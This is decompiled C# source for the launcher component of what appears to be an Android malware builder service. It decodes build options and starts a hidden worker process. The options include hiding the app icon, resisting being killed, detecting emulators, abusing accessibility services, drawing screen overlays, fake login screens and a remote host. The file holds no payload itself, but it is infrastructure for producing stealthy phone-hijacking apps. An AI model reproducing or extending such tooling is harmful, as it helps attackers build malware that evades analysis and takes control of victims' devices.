using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace EaodStarter;

[StandardModule]
internal sealed class Starter
{
	private static string userid;

	private static string appid;

	private static string ClientName = null;

	private static string UserHost = null;

	private static string use_access = null;

	private static string use_antkill = null;

	private static string use_atoprims = null;

	private static string notifytitle = null;

	private static string notifymsg = null;

	private static string allprims = null;

	private static string blackprims = null;

	private static string Buildtype = null;

	private static string appname = null;

	private static string appversion = null;

	private static string appicopath = null;

	private static string appurl = null;

	private static string logintitle = null;

	private static string logindis = null;

	private static string loginbtn = null;

	private static string lngshort = null;

	private static string hiddenapp = null;

	private static string noemulator = null;

	private static string installtype = null;

	private static string hidetype = null;

	private static string use_draw = null;

	private static string open_access = null;

	private static string descr_iption = null;

	private static string diao_type = null;

	private static string Email = null;

	private static string MainActivity = null;

	private static string appdir = null;

	private static string Workerid;

	[STAThread]
	public static void Main()
	{
		try
		{
			Thread.Sleep(2000);
			string[] array = Strings.Split(Interaction.Command());
			if ((array == null) | (array.Length == 0))
			{
				Console.WriteLine("Invalid Parameter Builder.");
				Environment.Exit(0);
			}
			string left = array[0].Trim('"');
			try
			{
				appid = Base64Decode(array[1].Trim('"'));
				userid = Base64Decode(array[2].Trim('"'));
				ClientName = Base64Decode(array[3].Trim('"'));
				Email = Base64Decode(array[4].Trim('"'));
				MainActivity = Base64Decode(array[5].Trim('"'));
				appdir = Base64Decode(array[6].Trim('"'));
				UserHost = Base64Decode(array[7].Trim('"'));
				use_access = Base64Decode(array[8].Trim('"'));
				use_antkill = Base64Decode(array[9].Trim('"'));
				use_atoprims = Base64Decode(array[10].Trim('"'));
				notifytitle = Base64Decode(array[11].Trim('"'));
				notifymsg = Base64Decode(array[12].Trim('"'));
				if (string.IsNullOrWhiteSpace(notifytitle) | string.IsNullOrEmpty(notifytitle))
				{
					notifytitle = "  ";
				}
				if (string.IsNullOrWhiteSpace(notifymsg) | string.IsNullOrEmpty(notifymsg))
				{
					notifymsg = "  ";
				}
				allprims = Base64Decode(array[13].Trim('"'));
				blackprims = Base64Decode(array[14].Trim('"'));
				Buildtype = Base64Decode(array[15].Trim('"'));
				appname = Base64Decode(array[16].Trim('"'));
				appversion = Base64Decode(array[17].Trim('"'));
				appicopath = Base64Decode(array[18].Trim('"'));
				appurl = Base64Decode(array[19].Trim('"'));
				logintitle = Base64Decode(array[20].Trim('"'));
				logindis = Base64Decode(array[21].Trim('"'));
				loginbtn = Base64Decode(array[22].Trim('"'));
				lngshort = Base64Decode(array[23].Trim('"'));
				hiddenapp = Base64Decode(array[24].Trim('"'));
				noemulator = Base64Decode(array[25].Trim('"'));
				installtype = Base64Decode(array[26].Trim('"'));
				hidetype = Base64Decode(array[27].Trim('"'));
				use_draw = Base64Decode(array[28].Trim('"'));
				open_access = Base64Decode(array[29].Trim('"'));
				descr_iption = Base64Decode(array[30].Trim('"'));
				diao_type = Base64Decode(array[31].Trim('"'));
				Console.WriteLine("appid: " + appid);
				Console.WriteLine("userid: " + userid);
				Console.WriteLine("ClientName: " + ClientName);
				Console.WriteLine("Email: " + Email);
				Console.WriteLine("MainActivity: " + MainActivity);
				Console.WriteLine("appdir: " + appdir);
				Console.WriteLine("UserHost: " + UserHost);
				Console.WriteLine("use_access: " + use_access);
				Console.WriteLine("use_antkill: " + use_antkill);
				Console.WriteLine("use_atoprims: " + use_atoprims);
				Console.WriteLine("notifytitle: " + notifytitle);
				Console.WriteLine("notifymsg: " + notifymsg);
				Console.WriteLine("allprims: " + allprims);
				Console.WriteLine("blackprims: " + blackprims);
				Console.WriteLine("Buildtype: " + Buildtype);
				Console.WriteLine("appname: " + appname);
				Console.WriteLine("appversion: " + appversion);
				Console.WriteLine("appicopath: " + appicopath);
				Console.WriteLine("appurl: " + appurl);
				Console.WriteLine("logintitle: " + logintitle);
				Console.WriteLine("logindis: " + logindis);
				Console.WriteLine("loginbtn: " + loginbtn);
				Console.WriteLine("lngshort: " + lngshort);
				Console.WriteLine("hiddenapp: " + hiddenapp);
				Console.WriteLine("noemulator: " + noemulator);
				Console.WriteLine("installtype: " + installtype);
				Console.WriteLine("hidetype: " + hidetype);
				Console.WriteLine("use_draw: " + use_draw);
				Console.WriteLine("open_access: " + open_access);
				Console.WriteLine("descr_iption: " + descr_iption);
				Console.WriteLine("diao_type: " + diao_type);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Console.WriteLine("> Error: Something went wrong");
				Mylogger.LogError(userid, "inialize values error:", ex2.Message);
				Environment.Exit(0);
				ProjectData.ClearProjectError();
			}
			Workerid = CovertToMD5(userid + "_" + appid);
			if (Operators.CompareString(left, "lunch", TextCompare: false) == 0)
			{
				if (Busy(Workerid))
				{
					Console.WriteLine("This app is building right now , please wait.");
					Environment.Exit(0);
				}
				string fileName = "EaodWorker.exe";
				string arguments = ToBase64(Workerid) + " " + ToBase64(appid) + " " + ToBase64(userid) + " " + ToBase64(ClientName) + " " + ToBase64(Email) + " " + ToBase64(MainActivity) + " " + ToBase64(appdir) + " " + ToBase64(UserHost) + " " + ToBase64(use_access) + " " + ToBase64(use_antkill) + " " + ToBase64(use_atoprims) + " " + ToBase64(notifytitle) + " " + ToBase64(notifymsg) + " " + ToBase64(allprims) + " " + ToBase64(blackprims) + " " + ToBase64(Buildtype) + " " + ToBase64(appname) + " " + ToBase64(appversion) + " " + ToBase64(appicopath) + " " + ToBase64(appurl) + " " + ToBase64(logintitle) + " " + ToBase64(logindis) + " " + ToBase64(loginbtn) + " " + ToBase64(lngshort) + " " + ToBase64(hiddenapp) + " " + ToBase64(noemulator) + " " + ToBase64(installtype) + " " + ToBase64(hidetype) + " " + ToBase64(use_draw) + " " + ToBase64(open_access) + " " + ToBase64(descr_iption) + " " + ToBase64(diao_type);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = fileName;
				processStartInfo.Arguments = arguments;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.UseShellExecute = true;
				Process.Start(processStartInfo);
				Console.WriteLine("Your app is building now , goto: Menu > Dashboard > Apps.");
			}
			else
			{
				Console.WriteLine("Invalid Command.");
			}
			Environment.Exit(0);
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			Console.WriteLine("> Starter: " + ex4.Message);
			Mylogger.LogError(userid, "Main starter", ex4.Message);
			ProjectData.ClearProjectError();
		}
	}

	public static string ToBase64(string input)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(input);
		return Convert.ToBase64String(bytes);
	}

	public static bool Busy(string userid)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\EaodWorkers");
			if (registryKey != null)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(userid));
				if (objectValue != null && int.TryParse(objectValue.ToString(), out var result))
				{
					Process processById = Process.GetProcessById(result);
					if (processById != null && !processById.HasExited)
					{
						return true;
					}
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public static string CovertToMD5(string retVal)
	{
		using MD5 mD = MD5.Create();
		return BitConverter.ToString(mD.ComputeHash(Encoding.Default.GetBytes(retVal))).Replace("-", string.Empty);
	}

	public static string Base64Decode(string encodedString)
	{
		byte[] bytes = Convert.FromBase64String(encodedString);
		return Encoding.UTF8.GetString(bytes);
	}
}
